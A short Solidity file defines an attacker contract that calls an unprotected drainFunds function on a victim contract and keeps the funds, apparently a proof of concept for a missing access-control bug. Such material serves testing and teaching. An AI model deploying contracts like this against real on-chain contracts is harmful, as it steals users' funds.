// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAccessVictim {
    function drainFunds(address payable recipient) external;
}

contract AccessControlAttacker {
    IAccessVictim public victim;

    event AttackStarted(address victim);
    event AttackFinished(uint256 stolenAmount);

    constructor(address _victim) {
        victim = IAccessVictim(_victim);
    }

    function attack() external {
        emit AttackStarted(address(victim));
        victim.drainFunds(payable(address(this)));
        emit AttackFinished(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
